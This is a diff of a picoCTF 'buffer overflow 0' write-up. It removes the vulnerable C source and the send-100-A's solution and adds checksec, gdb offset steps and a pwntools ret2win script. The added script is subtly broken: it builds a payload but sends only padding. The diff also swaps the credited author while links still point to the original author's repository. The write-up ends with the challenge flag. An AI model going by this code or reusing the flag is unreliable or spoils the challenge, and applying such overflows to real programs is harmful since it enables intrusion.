@@ -1,5 +1,5 @@
 # buffer overflow 0
-#### Write-up author : [jon-brandy](https://github.com/jon-brandy)
+#### Write-up author : vreshco
 ## DESCRIPTION:
 Smash the stack Let's start off simple, can you overflow the correct buffer? 
 The program is available [here](https://github.com/jon-brandy/CTF-WRITE-UP/blob/3505b54dcda38d2f82a13a3f0c10dca01ed65735/Asset/buffer%20overflow%200/vuln). You can view source [here](https://github.com/jon-brandy/CTF-WRITE-UP/blob/3505b54dcda38d2f82a13a3f0c10dca01ed65735/Asset/buffer%20overflow%200/vuln.c). 
@@ -13,112 +13,97 @@ And connect with it using:
 
 ## STEPS:
 1. First, download both files given.
-2. Next, let's check the program file BIT and whether the file is stripped or not.
+2. Next, let's check the file type.
+
+> RESULT - BINARY FILE 32 BIT, NOT STRIPPED.
+
+![image](https://user-images.githubusercontent.com/70703371/216072363-65882ebe-5259-452e-9b9a-e25eb1dbbfb7.png)
+
+
+3. Since it's a binary file, let's check the binary's protections.
+
+> RESULT - NO CANARY FOUND
+
+![image](https://user-images.githubusercontent.com/70703371/216072557-4e367ab0-d907-4f66-a140-88e87b14764f.png)
+
+
+4. Since there's no canary found, hence we don't need to worry about the canary, we can utilize the bufferoverflow concept.
+5. Start by run the binary using gdb and input cyclic 1024 pattern.
+
+> RESULT - THE PROGRAM CRASHED
+
+
+![image](https://user-images.githubusercontent.com/70703371/216072902-59f349d2-2ba3-4590-b2a7-b34833974e6c.png)
+
+
+6. As you can see, we succesfully overwrite the EBP.
+7. To know the correct offset, simply run `cyclic -l haaa` (get the 4 characters from **EIP**.
+
+![image](https://user-images.githubusercontent.com/70703371/216073235-dac0d415-cd49-4bf6-9d32-64d105a6a497.png)
+
+
+8. Great the correct offset is 28 bytes, hence we need to add 24 bytes as the padding. 
+9. Now to know the flag locations, let's read the source code.
+
+![image](https://user-images.githubusercontent.com/70703371/216073489-5c3b09f2-ff44-47fa-9aa4-a3d05a6f6393.png)
+
+
+10. Looks like the `sigsev_handler` functions shall be our interest now.
+11. Let's try to jump to the function by adding 24 bytes as the padding. This is a **ret2win** concept.
+12. Now get the address of `sigsev_handler` using gdb.
 
 > RESULT
 
-![image](https://user-images.githubusercontent.com/70703371/191660096-6b8c60dc-a7a6-4ff7-9d9c-480cf78aac97.png)
 
-3. Seems it's a 32 BIT file and luckily it's not stripped, so we can see the function names.
-4. Now let's check the file protection by run `checksec`.
-
-> RESULT
-
-![image](https://user-images.githubusercontent.com/70703371/191660229-44bb72b7-ee97-49a6-91bb-c3d4260358ca.png)
-
-5. **No canary** means we can do bufferoverflow and **pie enabled** means the offset won't be the same.
-6. Now let's analyze the source code.
-
-> VULN.C
-
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <signal.h>
-
-#define FLAGSIZE_MAX 64
-
-char flag[FLAGSIZE_MAX];
-
-void sigsegv_handler(int sig) {
-  printf("%s\n", flag);
-  fflush(stdout);
-  exit(1);
-}
-
-void vuln(char *input){
-  char buf2[16];
-  strcpy(buf2, input);
-}
-
-int main(int argc, char **argv){
-  
-  FILE *f = fopen("flag.txt","r");
-  if (f == NULL) {
-    printf("%s %s", "Please create 'flag.txt' in this directory with your",
-                    "own debugging flag.\n");
-    exit(0);
-  }
-  
-  fgets(flag,FLAGSIZE_MAX,f);
-  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
-  
-  gid_t gid = getegid();
-  setresgid(gid, gid, gid);
+![image](https://user-images.githubusercontent.com/70703371/216073949-cf6ff879-b78b-4fa7-a3aa-55a008c66852.png)
 
 
-  printf("Input: ");
-  fflush(stdout);
-  char buf1[100];
-  gets(buf1); 
-  vuln(buf1);
-  printf("The program will exit now\n");
-  return 0;
-}
+13. To solve this challenge i made a python script with **pwntools**.
 
+> THE SCRIPT
+
+```py
+#python3
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  
+        return process([exe] + argv, *a, **kw)
+
+
+exe = './vuln'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+sh = start()
+
+offset = b'A' * 24 # EIP -> 28
+
+p = flat([
+    offset,
+    0x130d
+])
+
+sh.sendlineafter(': ', offset)
+
+sh.interactive()
 ```
-
-7. We can take advantage of the `gets()` function to do buffer overflow.
-
-![image](https://user-images.githubusercontent.com/70703371/191661030-84fa11ae-61ca-4b3c-912d-af088a1907a1.png)
-
-> VULN FUNCTION
-
-![image](https://user-images.githubusercontent.com/70703371/191661949-82aea034-a405-4d36-8fca-8cae1e488500.png)
-
-8. So the goals here, we don't need to change the return address, we just have to bufferoverflow the input so the program crashed.
-
-![image](https://user-images.githubusercontent.com/70703371/191663182-14b0c269-0be4-4bc4-93fc-217da6683660.png)
-
-
-10. With that being said, the `sigsev` function triggered.
-
-![image](https://user-images.githubusercontent.com/70703371/191661091-f8b665ba-e6c7-4cc7-a251-69dc564dca10.png)
-
-10. Now let's create a `flag.txt` file and insert `FLAG{}` as the input.
-
-![image](https://user-images.githubusercontent.com/70703371/191662063-9b5052bc-cce2-4fad-a3a8-055661b4c643.png)
-
-
-![image](https://user-images.githubusercontent.com/70703371/191661564-77c87842-13ec-487d-b967-7178bcf7d0ba.png)
-
-11. Make the `vuln` file executable by run `chmod +x vuln`.
-12. Now run the file and input **100** A's.
 
 > OUTPUT
 
-![image](https://user-images.githubusercontent.com/70703371/191663241-0993e007-1e49-4624-91be-f2066a2c98b9.png)
+![image](https://user-images.githubusercontent.com/70703371/216074264-e52624b5-84b2-447c-9095-65b06f2d37c6.png)
 
 
-12. Run the `netcat` given and input the same A's length.
-
-![image](https://user-images.githubusercontent.com/70703371/191663372-efdec55d-79c9-46f2-b9fb-3cdc4ddacaec.png)
-
-13. We got the flag!
+14. Got the flag!
 
 ## FLAG
 
 ```
 picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
 ```
+
